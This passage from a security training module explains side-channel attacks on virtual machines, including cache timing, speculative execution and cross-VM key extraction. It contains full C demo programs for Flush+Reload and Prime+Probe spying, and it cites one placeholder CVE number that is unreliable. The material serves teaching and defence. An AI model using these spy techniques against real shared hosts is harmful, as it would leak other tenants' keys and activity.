# Side-Channel Attacks on Virtual Machines — CPU Cache, Speculative Execution, and Cross-VM Information Leakage

> **Module:** Migrazione VMware → Proxmox VE
> **Position in curriculum:** Security Deep-Dive — Module 34 (advanced offensive/defensive)
> **Prerequisites:** Modules 01-02 (VMware/Proxmox fundamentals), Module 12 (Security & Compliance), Module 20 (Hypervisor Hardening), Module 21 (VM Escape); solid understanding of x86 microarchitecture, CPU caches, operating system memory management, C programming.
> **Learning objectives.** Upon completion the student will be able to:
> 1. Classify side-channel attacks by information leakage vector and evaluate their applicability to virtualized environments;
> 2. Implement and analyze CPU cache attacks (Flush+Reload, Prime+Probe) to understand their mechanics at the microarchitectural level;
> 3. Explain every major speculative execution vulnerability from Spectre through SLAM, including the transient execution window and gadget requirements;
> 4. Assess cross-VM attack feasibility in multi-tenant cloud environments and quantify information leakage rates;
> 5. Apply hardware, firmware, hypervisor, and VM-level mitigations and measure their performance impact;
> 6. Configure Proxmox VE and KVM for defense-in-depth against microarchitectural attacks;
> 7. Evaluate confidential computing technologies (SEV-SNP, TDX, CCA) as architectural countermeasures;
> 8. Build a research lab environment to safely demonstrate and measure side-channel attacks between co-located VMs.
> **Estimated time:** reading 4-5 hours; lab exercises 12-20 hours
> **Level:** Expert (Dreyfus 5); requires offensive security mindset and microarchitecture literacy
> **Last update:** 2026-05-07
> **Reference versions:** Linux 6.x, KVM (QEMU 8.x/9.x), Proxmox VE 8.x, Intel microcode 20240312+, AMD microcode 2024+
> **Audience:** Senior IT professionals, ethical hackers, penetration testers, cloud security architects

---

## Table of Contents

1. [Side-Channel Attack Fundamentals](#1-side-channel-attack-fundamentals)
2. [CPU Cache Attacks](#2-cpu-cache-attacks)
3. [Speculative Execution Attacks](#3-speculative-execution-attacks)
4. [Cross-VM Attack Scenarios](#4-cross-vm-attack-scenarios)
5. [Mitigations — Hardware and Microcode](#5-mitigations--hardware-and-microcode)
6. [Mitigations — Software and Hypervisor](#6-mitigations--software-and-hypervisor)
7. [Mitigations — VM Configuration](#7-mitigations--vm-configuration)
8. [Confidential Computing](#8-confidential-computing)
9. [Detection and Monitoring](#9-detection-and-monitoring)
10. [Lab: Side-Channel Research Environment](#10-lab-side-channel-research-environment)

---

## 1. Side-Channel Attack Fundamentals

### 1.1 Information Leakage Through Shared Resources

A side-channel attack extracts information from a system not through a vulnerability in its logical design (a bug in the algorithm, a flaw in the protocol) but through observable physical or microarchitectural effects of computation. The fundamental principle: **any shared resource whose state is measurable by an attacker becomes a potential information channel.**

In a virtualized environment, the hypervisor provides logical isolation — each VM has its own virtual CPU, its own memory address space, its own virtual devices. However, the underlying physical hardware is shared. Multiple VMs execute on the same physical CPU cores, share the same cache hierarchy, use the same memory bus, and contend for the same interconnect bandwidth. These shared physical resources create side channels that the hypervisor's logical isolation cannot fully eliminate without hardware support.

The information leakage model:

```
┌─────────────────────────────────────────────────────────────────┐
│                    Physical Hardware                              │
│                                                                   │
│  ┌──────────┐  ┌──────────┐  ┌──────────────┐  ┌────────────┐  │
│  │ CPU Core │  │ CPU Core │  │   L3 / LLC   │  │ Memory Bus │  │
│  │  (L1/L2) │  │  (L1/L2) │  │   (Shared)   │  │  (Shared)  │  │
│  └────┬─────┘  └────┬─────┘  └──────┬───────┘  └─────┬──────┘  │
│       │              │               │                 │          │
│       │   VM-A       │   VM-B        │   Both VMs     │  Both    │
│       │   vCPU       │   vCPU        │   evict/load   │  contend │
│       │              │               │                 │          │
│  Side channel: timing differences in cache access reveal         │
│  which addresses the OTHER VM accessed.                          │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 Channel Taxonomy

Side channels in computing systems are classified along two axes: directionality and mechanism.

**By directionality:**

| Type | Direction | Description |
|------|-----------|-------------|
| Side channel | Victim → Attacker (unintentional) | Victim's computation inadvertently modifies shared state that attacker can measure |
| Covert channel | Sender → Receiver (intentional) | Two colluding parties communicate through a shared resource, bypassing isolation |
| Timing channel | Subset of both | Information encoded in time (latency, duration, ordering) |

**By mechanism:**

| Mechanism | Observable | Examples |
|-----------|-----------|----------|
| Timing channel | Duration of operations | Cache hit vs miss latency, branch prediction hit/miss |
| Storage channel | State of shared resource | Cache line presence/absence, TLB entry state |
| Access-driven | Whether a resource was accessed | Page table accessed/dirty bits, cache set occupancy |
| Trace-driven | Sequence of accesses | Full cache access pattern (requires stronger attacker) |
| Power/EM | Physical emanation | Power consumption, electromagnetic radiation |
| Contention | Resource availability | Memory bandwidth, functional unit occupancy |

In virtualized environments, **timing channels** and **storage channels** via CPU caches are the most practical and well-studied vectors. Power/EM attacks typically require physical proximity to the hardware and are less relevant in cloud multi-tenancy (though not impossible for a malicious cloud operator).

### 1.3 Shared Resources in Virtual Environments

The following hardware resources are shared among co-located VMs and represent potential side-channel leakage surfaces:

**CPU Caches (L1D, L1I, L2, L3/LLC):**
The most exploited resource. Cache lines are indexed by physical address bits. Two VMs executing on the same core share L1/L2; VMs on different cores within the same socket share L3/LLC. The LLC is the dominant cross-core, cross-VM channel.

**Translation Lookaside Buffer (TLB):**
Stores recent virtual-to-physical address translations. TLB entries are tagged per-process/VMID (with VPID/ASID), but some implementations have shared components. TLB contention reveals memory access patterns.

**Branch Predictor:**
The Branch Target Buffer (BTB), Pattern History Table (PHT), and Return Stack Buffer (RSB) are microarchitecturally indexed structures. Cross-VM sharing of these structures enables Spectre-class attacks.

**Memory Bus and Interconnect:**
Bandwidth contention on the memory controller or inter-core mesh/ring interconnect creates coarse-grained timing signals. A VM performing heavy memory operations can observe latency variations caused by another VM's memory traffic.

**Execution Units:**
Functional units (ALUs, FPUs, vector units) within a core are shared between hardware threads (SMT). Contention on these units leaks information about instruction mix.

**DRAM Row Buffer:**
DRAM is organized in banks with row buffers. Accessing the same row (row hit) is faster than switching rows (row conflict). Two VMs accessing the same DRAM bank create observable timing differences.

### 1.4 Threat Model: Co-located VMs on the Same Physical Host

The canonical threat model for side-channel attacks in virtualization:

**Attacker capabilities:**
- Controls one VM (the "spy") on the same physical host as the target VM (the "victim")
- Can execute arbitrary user-space code in the spy VM
- Has no elevated privileges — not root in the spy VM, no hypervisor access
- Cannot directly read victim memory (hypervisor isolation is intact)
- Can measure timing with high precision (rdtsc, rdtscp, or alternative timing sources)

**Attacker goals:**
- Extract cryptographic keys from the victim VM
- Determine which applications/websites the victim is accessing
- Detect keystrokes or user activity patterns
- Establish a covert communication channel bypassing network isolation
- Infer confidential data processed by the victim

**Attack preconditions:**
1. **Co-location**: Attacker's VM runs on the same physical host (possibly same core for L1/L2 attacks, same socket for LLC attacks)
2. **Timing source**: Attacker can measure time with sufficient granularity (typically nanosecond-level for cache attacks)
3. **Shared resource access**: The targeted shared resource is not fully partitioned or flushed between VM context switches

### 1.5 Cloud-Specific Threat: Multi-Tenancy

Public cloud environments create an ideal setting for side-channel attacks:

- **Forced co-location**: Multiple customers' workloads share the same physical hardware to maximize utilization
- **Attacker-controlled placement**: Research has demonstrated that attackers can achieve co-location with a target through strategic VM placement (same availability zone, same instance type, timing of launch)
- **Long-running proximity**: Cloud VMs may run for weeks or months on the same host, giving the attacker ample time for low-bandwidth side channels
- **Limited customer visibility**: The customer typically cannot verify which other tenants share their physical hardware
- **Performance pressure against mitigations**: Cloud providers face economic pressure to minimize performance-impacting mitigations

Notable research on achieving co-location:
- Ristenpart et al. (2009) — "Hey, You, Get Off of My Cloud" — demonstrated targeted co-location on Amazon EC2
- Varadarajan et al. (2015) — "Placement Vulnerability Study in Multi-Tenant Public Clouds"
- Inci et al. (2016) — demonstrated cross-VM RSA key extraction on Amazon EC2

The economic reality: full mitigation of all known side channels (disable SMT, partition caches, flush microarchitectural state on every context switch) would reduce server throughput by 30-50%, making cloud economics unviable. This creates a persistent tension between security and cost.

---

## 2. CPU Cache Attacks

### 2.1 Cache Architecture Review

Modern x86 CPUs implement a multi-level cache hierarchy:

```
┌─────────────────────────────────────────────────────────────┐
│  CPU Core 0                        CPU Core 1               │
│  ┌──────────────────┐             ┌──────────────────┐      │
│  │ L1I Cache (32KB) │             │ L1I Cache (32KB) │      │
│  │ L1D Cache (48KB) │             │ L1D Cache (48KB) │      │
│  │ 8-way, 64B line  │             │ 8-way, 64B line  │      │
│  └────────┬─────────┘             └────────┬─────────┘      │
│           │                                 │                │
│  ┌────────┴─────────┐             ┌────────┴─────────┐      │
│  │ L2 Cache (1.25MB)│             │ L2 Cache (1.25MB)│      │
│  │ 10-way, unified  │             │ 10-way, unified  │      │
│  └────────┬─────────┘             └────────┴─────────┘      │
│           │                                 │                │
│           └──────────────┬──────────────────┘                │
│                          │                                   │
│  ┌───────────────────────┴──────────────────────────────┐    │
│  │           L3 / LLC (Last Level Cache)                 │    │
│  │           16-30MB, 12-16 way, shared across all cores │    │
│  │           Inclusive or non-inclusive depending on arch │    │
│  └──────────────────────────────────────────────────────┘    │
│                          │                                   │
│                    Main Memory (DRAM)                         │
└─────────────────────────────────────────────────────────────┘
```

**Key terminology:**

- **Cache line**: The minimum unit of data transfer between cache levels (64 bytes on x86).
- **Set**: A group of cache lines that map to the same index. For an N-way associative cache, each set holds N lines.
- **Way**: One slot within a set. An 8-way cache has 8 slots per set.
- **Tag**: Upper address bits stored alongside data to identify which memory address a cache line belongs to.
- **Index**: Middle address bits that select which set a memory address maps to.
- **Offset**: Lower address bits (6 bits for 64-byte lines) selecting a byte within the line.

For a cache with S sets, W ways, and line size L:
- Offset bits = log2(L) = 6
- Index bits = log2(S)
- Tag bits = address_bits - index_bits - offset_bits

**Inclusive vs Non-inclusive LLC:**

- **Inclusive** (pre-Skylake Intel): Every line in L1/L2 is also in L3. Evicting from L3 forces eviction from L1/L2. This property is exploited by LLC-based attacks to affect core-private caches.
- **Non-inclusive** (Skylake+, AMD Zen): L3 is a victim cache or non-inclusive directory. LLC eviction does not necessarily evict from L1/L2. Changes attack strategy.

### 2.2 Flush+Reload

**Prerequisite**: Shared memory between attacker and victim. In virtualization, this occurs through:
- Memory deduplication (KSM — Kernel Same-page Merging)
- Shared libraries mapped from the host filesystem (paravirtualized guests)
- Shared page cache for identical binaries

**Mechanism:**

```
Attacker (Spy Process):                    Victim Process:
                                           
1. FLUSH target cache line                 
   (clflush instruction)                   
   └─ Evicts line from ALL cache levels    
                                           
2. WAIT (allow victim to execute)          2. Victim accesses memory
                                              └─ If target addr accessed:
                                                 cache line reloaded
                                           
3. RELOAD target address                   
   └─ Measure access time                  
   └─ FAST (cache hit) → victim accessed   
   └─ SLOW (cache miss) → victim did NOT   
```

**Timing threshold**: On modern Intel CPUs, L1 hit ≈ 4 cycles, L3 hit ≈ 40-50 cycles, DRAM access ≈ 200-300 cycles. The attacker distinguishes cache hit (~40-50 cycles if in LLC after victim loaded it) from cache miss (~200+ cycles).

**Educational C implementation** (Flush+Reload spy on a shared library function):

```c
/* flush_reload_demo.c
 * Educational demonstration of Flush+Reload technique.
 * REQUIRES: shared memory page with victim (e.g., shared .so)
 * WARNING: This code is for authorized research in isolated lab environments ONLY.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

#define CACHE_HIT_THRESHOLD 150  /* cycles — calibrate per system */
#define SAMPLES 100000
#define SLOT_DURATION_US 5       /* microseconds between probe */

/* Read Time Stamp Counter with serialization */
static inline uint64_t rdtsc_begin(void) {
    uint32_t lo, hi;
    __asm__ volatile (
        "mfence\n\t"
        "lfence\n\t"
        "rdtsc\n\t"
        : "=a"(lo), "=d"(hi)
    );
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t rdtsc_end(void) {
    uint32_t lo, hi;
    __asm__ volatile (
        "rdtscp\n\t"
        : "=a"(lo), "=d"(hi)
        :
        : "rcx"
    );
    __asm__ volatile ("lfence\n\t");
    return ((uint64_t)hi << 32) | lo;
}

/* Flush a cache line */
static inline void clflush(volatile void *addr) {
    __asm__ volatile ("clflush (%0)" :: "r"(addr) : "memory");
}

/* Measure reload time for a single address */
static inline uint64_t reload_time(volatile void *addr) {
    uint64_t t0, t1;
    t0 = rdtsc_begin();
    *(volatile char *)addr;
    t1 = rdtsc_end();
    return t1 - t0;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <path_to_shared_library>\n", argv[0]);
        return 1;
    }

    /* Map the shared library (same physical pages as victim if deduplicated) */
    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    size_t map_size = 4096 * 256; /* map enough pages */
    void *base = mmap(NULL, map_size, PROT_READ, MAP_SHARED, fd, 0);
    if (base == MAP_FAILED) { perror("mmap"); return 1; }

    /* Target: monitor access to a specific offset in the library
     * In a real attack, this would be the entry point of a crypto function,
     * a branch target, or a lookup table entry. */
    size_t target_offset = 0x1000; /* example offset — adjust for target */
    volatile char *target = (volatile char *)base + target_offset;

    printf("[*] Monitoring address %p (offset 0x%zx in %s)\n",
           (void *)target, target_offset, argv[1]);
    printf("[*] Threshold: %d cycles\n", CACHE_HIT_THRESHOLD);
    printf("[*] Collecting %d samples...\n", SAMPLES);

    int hits = 0;
    uint64_t timings[SAMPLES];

    for (int i = 0; i < SAMPLES; i++) {
        /* FLUSH phase */
        clflush(target);
        _mm_mfence();

        /* WAIT phase — let victim execute */
        usleep(SLOT_DURATION_US);

        /* RELOAD phase — measure access time */
        uint64_t t = reload_time(target);
        timings[i] = t;

        if (t < CACHE_HIT_THRESHOLD) {
            hits++;
        }
    }

    printf("[*] Results: %d hits out of %d samples (%.2f%% hit rate)\n",
           hits, SAMPLES, (double)hits / SAMPLES * 100.0);

    /* Dump timing histogram for analysis */
    FILE *fp = fopen("/tmp/flush_reload_timings.csv", "w");
    if (fp) {
        fprintf(fp, "sample,cycles\n");
        for (int i = 0; i < SAMPLES; i++) {
            fprintf(fp, "%d,%lu\n", i, timings[i]);
        }
        fclose(fp);
        printf("[*] Timings written to /tmp/flush_reload_timings.csv\n");
    }

    munmap(base, map_size);
    close(fd);
    return 0;
}
```

**Compile and calibrate:**
```bash
gcc -O2 -o flush_reload_demo flush_reload_demo.c -lrt
# Calibrate threshold by running without victim first (all misses)
# Then with victim accessing the target address (should see hits)
```

### 2.3 Prime+Probe

**No shared memory required.** The attacker uses their own memory to fill specific cache sets, then measures whether the victim evicted any of their lines. This works across VM boundaries without memory deduplication.

**Mechanism:**

```
Attacker:                                  Victim:
                                           
1. PRIME: Fill target cache set with       
   attacker's own data (W accesses to      
   addresses mapping to the same set)      
                                           
2. WAIT                                    2. Victim executes, potentially
                                              accessing addresses that map
                                              to the same cache set
                                              └─ Evicts attacker's lines
                                           
3. PROBE: Reload attacker's data from      
   the primed set, measure timing          
   └─ ALL FAST → victim did NOT access     
      this set                             
   └─ SOME SLOW → victim accessed          
      addresses in this set (evicted       
      attacker lines)                      
```

**Cache set addressing for LLC (slice-aware):**

On Intel CPUs, the LLC is divided into slices (one per core), and a hash function maps physical addresses to slices. The attacker must reverse-engineer this hash (known for many Intel generations) to target specific sets.

```
Physical Address bits:
[Tag | Slice Hash Bits | Set Index | Line Offset (6 bits)]
                                     └─ determines which set
         └─ determines which LLC slice
```

**Educational C implementation** (Prime+Probe on LLC):

```c
/* prime_probe_llc.c
 * Demonstrates Prime+Probe on Last Level Cache.
 * No shared memory required — works across VM boundaries.
 * For authorized research use only.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <unistd.h>

#define LLC_WAYS       16        /* associativity of LLC */
#define LLC_SETS       2048      /* number of sets (varies by CPU) */
#define CACHE_LINE     64
#define PAGE_SIZE      4096
#define PROBE_THRESHOLD 200      /* cycles — LLC miss threshold */

/* Eviction set: LLC_WAYS addresses mapping to the same LLC set */
struct eviction_set {
    volatile char *addrs[LLC_WAYS];
    int set_index;
};

static inline uint64_t rdtsc_fenced(void) {
    uint32_t lo, hi;
    __asm__ volatile (
        "mfence\n\t"
        "lfence\n\t"
        "rdtsc\n\t"
        : "=a"(lo), "=d"(hi)
    );
    return ((uint64_t)hi << 32) | lo;
}

/* Allocate a large buffer and build eviction sets.
 * Simplified: assumes no LLC slice hashing (or known hash).
 * Real implementation needs reverse-engineered slice function. */
static void *alloc_probe_buffer(size_t size) {
    void *buf = mmap(NULL, size, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    if (buf == MAP_FAILED) {
        /* Fallback to regular pages */
        buf = mmap(NULL, size, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    }
    if (buf == MAP_FAILED) { perror("mmap"); exit(1); }
    memset(buf, 0x41, size); /* fault in pages */
    return buf;
}

/* Build eviction set for a specific cache set index */
static void build_eviction_set(struct eviction_set *es, void *buffer,
                                int target_set, size_t buffer_size) {
    es->set_index = target_set;
    /* Stride = LLC_SETS * CACHE_LINE to hit same set */
    size_t stride = (size_t)LLC_SETS * CACHE_LINE;
    /* Offset within buffer for this set */
    size_t base_offset = (size_t)target_set * CACHE_LINE;

    for (int w = 0; w < LLC_WAYS; w++) {
        size_t offset = base_offset + (w * stride);
        if (offset >= buffer_size) {
            fprintf(stderr, "Buffer too small for eviction set\n");
            exit(1);
        }
        es->addrs[w] = (volatile char *)buffer + offset;
    }
}

/* Prime: load all lines of the eviction set into LLC */
static void prime(struct eviction_set *es) {
    for (int w = 0; w < LLC_WAYS; w++) {
        *(es->addrs[w]);
    }
    _mm_mfence();
}

/* Probe: reload eviction set and measure total time */
static uint64_t probe(struct eviction_set *es) {
    uint64_t total = 0;
    for (int w = 0; w < LLC_WAYS; w++) {
        uint64_t t0 = rdtsc_fenced();
        *(es->addrs[w]);
        uint64_t t1 = rdtsc_fenced();
        total += (t1 - t0);
    }
    return total;
}

int main(void) {
    /* Buffer large enough for LLC_WAYS * LLC_SETS lines */
    size_t buf_size = (size_t)LLC_WAYS * LLC_SETS * CACHE_LINE * 2;
    void *buffer = alloc_probe_buffer(buf_size);

    printf("[*] Prime+Probe LLC demonstration\n");
    printf("[*] LLC: %d ways, %d sets, %d byte lines\n",
           LLC_WAYS, LLC_SETS, CACHE_LINE);
    printf("[*] Buffer: %zu MB at %p\n", buf_size / (1024*1024), buffer);

    /* Monitor a specific set (e.g., set 42) */
    int target_set = 42;
    struct eviction_set es;
    build_eviction_set(&es, buffer, target_set, buf_size);

    printf("[*] Monitoring LLC set %d\n", target_set);
    printf("[*] Baseline (no victim activity):\n");

    /* Baseline measurement */
    uint64_t baseline_total = 0;
    int baseline_samples = 1000;
    for (int i = 0; i < baseline_samples; i++) {
        prime(&es);
        _mm_mfence();
        usleep(1); /* minimal wait */
        uint64_t t = probe(&es);
        baseline_total += t;
    }
    double baseline_avg = (double)baseline_total / baseline_samples;
    printf("    Average probe time: %.1f cycles\n", baseline_avg);

    /* Continuous monitoring */
    printf("[*] Continuous monitoring (Ctrl+C to stop):\n");
    int eviction_count = 0;
    int total_probes = 0;

    for (int i = 0; i < 100000; i++) {
        prime(&es);
        _mm_mfence();
        usleep(10); /* wait for potential victim activity */
        uint64_t t = probe(&es);
        total_probes++;

        /* If probe time significantly exceeds baseline, victim evicted lines */
        if (t > baseline_avg * 1.5) {
            eviction_count++;
            if (eviction_count % 100 == 0) {
                printf("    [%d] Eviction detected: %lu cycles "
                       "(baseline: %.0f)\n", i, t, baseline_avg);
            }
        }
    }

    printf("[*] Summary: %d evictions in %d probes (%.2f%%)\n",
           eviction_count, total_probes,
           (double)eviction_count / total_probes * 100.0);

    munmap(buffer, buf_size);
    return 0;
}
```

### 2.4 Flush+Flush

A stealthier variant of Flush+Reload. Instead of measuring reload time, the attacker measures the time of the `clflush` instruction itself.

**Key insight**: `clflush` on a line that is present in cache takes longer than `clflush` on a line that is not cached (because it must actually invalidate the line and possibly write it back if dirty).

**Advantages:**
- Does not bring the target line into the attacker's cache (stealthier)
- Hardware performance counters that track cache loads do not detect it
- Lower noise than Flush+Reload in some configurations

**Timing difference**: Typically 5-20 cycles difference between flush-hit and flush-miss. Requires very precise timing and careful statistical analysis.

### 2.5 Evict+Reload

When `clflush` is not available (some ARM platforms, or when the instruction is trapped), the attacker can replace the flush step with cache eviction through contention:

1. Access enough conflicting addresses to evict the target line from cache
2. Wait for victim execution
3. Reload and measure

**Disadvantage**: Slower and noisier than Flush+Reload because eviction is probabilistic and requires knowing or guessing cache set mapping.

### 2.6 Cache-Timing Attacks on Cryptographic Implementations

The most consequential application of cache attacks is extracting cryptographic keys. The canonical example: **AES T-table attacks.**

**AES T-table implementation** (common in OpenSSL before constant-time implementations):

AES uses lookup tables (T-tables) where the index depends on the key XORed with plaintext:

```
T-table access: T[plaintext[i] XOR key[i]]
```

The cache line accessed by this lookup depends on the key byte. By observing which cache lines are loaded during encryption, the attacker recovers key bytes.

**Attack steps:**
1. Spy process monitors cache lines corresponding to T-table entries (256 entries × 4 bytes = 1024 bytes → 16 cache lines)
2. Victim encrypts data
3. Spy determines which of the 16 cache lines were accessed
4. Over multiple encryptions, statistical analysis reveals the key

**Research results:**
- Osvik, Shamir, Tromer (2006): Full AES key recovery from co-located process in 65ms
- Gullasch, Bangerter, Krenn (2011): 2.8 seconds for AES-128 key recovery on a loaded system
- Irazoqui, Inci, Eisenbarth, Sunar (2014): Cross-VM AES key recovery through LLC

**Countermeasure**: Constant-time implementations (AES-NI hardware instruction, bitsliced AES, scatter/gather implementations that access all table entries regardless of key).

---

## 3. Speculative Execution Attacks

### 3.1 Speculative Execution Background

Modern out-of-order CPUs speculatively execute instructions before resolving control flow (branches) or data dependencies. If the speculation is correct, results are committed. If incorrect, results are architecturally rolled back — **but microarchitectural side effects persist.** Cache lines loaded during speculative execution remain in cache even after rollback.

This fundamental observation — that speculation creates persistent microarchitectural state — is the basis for all transient execution attacks.

```
Normal Execution:          Speculative Execution:
                           
if (x < array_len) {       CPU predicts branch taken:
    y = array[x];          → Loads array[x] speculatively
    z = array2[y * 256];   → Loads array2[y*256] speculatively
}                          → array2[y*256] now in CACHE
                           
                           Branch resolves: x >= array_len
                           → Architectural state rolled back
                           → y, z never committed
                           → BUT array2[y*256] remains cached!
                           
                           Attacker probes array2[] to determine y
```

### 3.2 Spectre Variant 1 — Bounds Check Bypass (CVE-2017-5753)

**Mechanism**: The attacker mistrains the CPU's branch predictor to speculatively execute past an array bounds check, causing out-of-bounds memory reads that leak through a cache side channel.

**Gadget pattern:**

```c
/* Vulnerable code pattern (Spectre v1 gadget) */
if (x < array1_size) {           /* bounds check — can be mispredicted */
    y = array1[x];               /* out-of-bounds read during speculation */
    temp = array2[y * 256];      /* dependent load — encodes secret in cache */
}
```

**Attack steps:**
1. Train branch predictor: provide valid values of `x` repeatedly (branch taken)
2. Supply malicious `x` (out of bounds, points to target secret)
3. CPU speculatively reads `array1[x]` = secret byte
4. Speculative dependent load touches `array2[secret * 256]`
5. After rollback, probe `array2` to determine which line is cached → reveals secret

**Scope**: Intra-process boundary violation. In VM context: guest kernel to guest user space, or within a sandboxed environment (JavaScript JIT, eBPF).

### 3.3 Spectre Variant 2 — Branch Target Injection (CVE-2017-5715)

**Mechanism**: The attacker poisons the indirect branch predictor to redirect speculative execution to an attacker-chosen gadget address in the victim's address space.

**Key difference from v1**: Instead of mispredicting a conditional branch direction, the attacker controls the predicted *target* of an indirect branch (call, jump through register/memory).

**Cross-VM relevance**: The Branch Target Buffer (BTB) is shared between hardware threads on the same core. A VM running on one hyperthread can poison BTB entries used by a VM on the sibling hyperthread.

**Attack flow:**
1. Attacker identifies useful gadgets in victim code (speculative ROP-like gadgets)
2. Attacker trains the BTB from their own address space, creating entries that alias with victim's indirect branches
3. When victim executes the indirect branch, CPU speculatively jumps to attacker-chosen gadget
4. Gadget reads secret data and encodes it through cache side channel
5. Attacker reads the encoded secret

### 3.4 Meltdown (CVE-2017-5754) — Rogue Data Cache Load

**Mechanism**: Exploits out-of-order execution to read kernel memory from user space. When a user-space instruction loads a kernel address, the load completes speculatively (data is fetched into registers) before the permission check raises a fault. During this window, the data can be encoded into cache state.

**Impact**: Read arbitrary kernel memory (and thus any physical memory via direct-map region) from unprivileged user space.

**VM impact**: On vulnerable CPUs without KPTI, a guest user-space process could potentially read hypervisor memory (depending on address space layout).

**Fixed by**: Kernel Page Table Isolation (KPTI/KAISER), and hardware fixes in post-2018 CPUs (Intel from Whiskey Lake onwards).

### 3.5 Microarchitectural Data Sampling (MDS) — RIDL, Fallout, ZombieLoad

A family of attacks that leak in-flight data from microarchitectural buffers:

**ZombieLoad (CVE-2019-11091, CVE-2018-12130)**: Reads data from the Line Fill Buffer (LFB) during transient execution. When a faulting or assisted load occurs, the CPU may supply stale data from the LFB instead of the correct value. This data may belong to another process, another VM, or the hypervisor.

**RIDL — Rogue In-Flight Data Load (CVE-2018-12127)**: Similar to ZombieLoad but targets the Load Port and Store Buffer. Leaks in-flight data from these internal buffers.

**Fallout (CVE-2018-12126)**: Targets the Store Buffer specifically. Exploits store-to-load forwarding logic to read stale store buffer entries from other security contexts.

**Cross-VM impact**: All MDS variants can leak data across hyperthreads on the same core. If attacker and victim VMs share a physical core (SMT), MDS enables cross-VM data leakage without shared memory or cache attacks.

**Mitigation**: Microcode updates + kernel support for buffer clearing (VERW instruction), or disabling SMT entirely.

### 3.6 Transient Execution: Load Value Injection (LVI) — CVE-2020-0551

**Reverse Meltdown**: Instead of the attacker reading victim data through speculation, the attacker *injects* data into the victim's transient execution window.

**Mechanism**: Attacker fills microarchitectural buffers (LFB, store buffer) with chosen values. When victim executes a faulting/assisted load, the CPU may forward attacker-controlled data to the victim's computation, causing the victim to compute on poisoned data and leak results.

**Unique danger**: Even if the victim's code is constant-time and free of Spectre gadgets, LVI can force the victim to leak secrets by operating on attacker-injected values.

### 3.7 Spectre-RSB — Return Stack Buffer Poisoning

The Return Stack Buffer (RSB) predicts return addresses. It can be poisoned:

1. Attacker creates deep call stacks to fill RSB with chosen return addresses
2. On context switch to victim, RSB entries may still be present (stale)
3. Victim's return instructions speculatively jump to attacker-chosen addresses

**Cross-VM**: RSB is per-core and not fully flushed on VM entry/exit on older CPUs. A VM exit followed by VM entry to a different guest can leave stale RSB entries.

**Mitigation**: RSB stuffing (fill RSB with benign entries on context switch), IBRS.

### 3.8 Branch History Injection (BHI) — CVE-2022-0001

Bypasses hardware Spectre v2 mitigations (eIBRS) by exploiting the Branch History Buffer (BHB). Even with eIBRS, the BHB is shared between user and kernel (or between guest and host), allowing prediction poisoning.

**Implication**: CPUs with eIBRS (supposedly "fixed" for Spectre v2) are still vulnerable if BHB is not cleared on privilege transitions.

### 3.9 Retbleed (CVE-2022-29900, CVE-2022-29901)

Demonstrates that return instructions can be exploited similarly to indirect branches. On AMD CPUs and older Intel CPUs, returns can sometimes use the BTB instead of the RSB (when RSB underflows), enabling Spectre-like attacks through return instructions — even when retpolines are deployed.

**Impact**: Retpoline, the primary software mitigation for Spectre v2, is bypassed on affected CPUs.

### 3.10 Downfall / GDS (CVE-2022-40982)

**Gather Data Sampling**: Exploits the `gather` instruction (AVX2/AVX-512) which accesses non-contiguous memory locations. A transient execution during gather can leak data from sibling hardware threads sharing the same physical core.

**Affected**: Intel Skylake through Ice Lake (6th-10th gen).

**Scope**: Cross-process and cross-VM on the same core. Particularly dangerous because gather instructions are common in optimized crypto, ML, and database workloads.

### 3.11 Inception / SRSO (CVE-2023-20569)

**Speculative Return Stack Overflow (AMD)**: On AMD Zen 1-4 CPUs, an attacker can create speculative execution at attacker-controlled addresses by overflowing the RSB/RAS (Return Address Stack) and triggering fallback to the BTB for return predictions.

**Impact**: Cross-address-space speculative execution on AMD CPUs, bypassing previous mitigations.

### 3.12 SLAM (CVE-2023-XXXXX)

**Spectre based on Linear Address Masking**: Exploits LAM (Intel) / UAI (AMD) / TBI (ARM) features that allow software to store metadata in upper pointer bits. These features create new Spectre gadgets because the CPU must now speculatively mask/unmask pointer bits, creating windows for transient execution with unmasked (potentially attacker-controlled) addresses.

**Status**: Demonstrated on upcoming CPU features (LAM/UAI). Forward-looking threat.

---

## 4. Cross-VM Attack Scenarios

### 4.1 Cryptographic Key Extraction from Co-located VM

The canonical cross-VM attack: extract RSA, AES, or ECDSA keys from a victim VM using cache side channels.

**RSA key recovery via LLC Prime+Probe:**

RSA implementations using square-and-multiply algorithms exhibit key-dependent cache access patterns:

```
For each bit of the private exponent:
  - Always perform squaring (accesses specific code/data)
  - If bit = 1: also perform multiplication (accesses additional code/data)
```

By monitoring which LLC sets are active during RSA operations, the attacker reconstructs the private exponent bit by bit.

**Demonstrated attack parameters:**
| Parameter | Value |
|-----------|-------|
| Key size | RSA-2048 |
| Recovery time | 10-60 minutes |
| Leakage channel | LLC Prime+Probe |
| Co-location | Same socket, different core |
| Published | Liu et al. (2015), "Last-Level Cache Side-Channel Attacks are Practical" |

**ECDSA nonce leakage:**

ECDSA signing uses a random nonce `k`. If even a few bits of `k` leak per signature, the private key can be recovered via lattice attacks (Hidden Number Problem). Cache attacks leaking branch decisions during scalar multiplication provide exactly these bits.

### 4.2 Keystroke Timing Analysis Through Cache

Even without extracting cryptographic material, side channels reveal user behavior:

**Attack**: Monitor cache activity on the victim VM to detect keystroke events.

**Mechanism**: Keyboard interrupt handling in the guest kernel touches specific memory regions (interrupt handler, keyboard driver buffer). By monitoring the corresponding LLC sets, the attacker detects when keystrokes occur.

**Information gained:**
- Inter-keystroke timing (word boundaries, typing patterns)
- Application switching patterns
- Distinguishing password entry from normal typing (typing speed decreases)

**Published accuracy**: 40-70% character recovery for passwords using timing alone (Song et al., combined with language models).

### 4.3 Network Traffic Analysis Through LLC

**Attack**: Monitor LLC activity corresponding to the victim's network stack.

**Observable signals:**
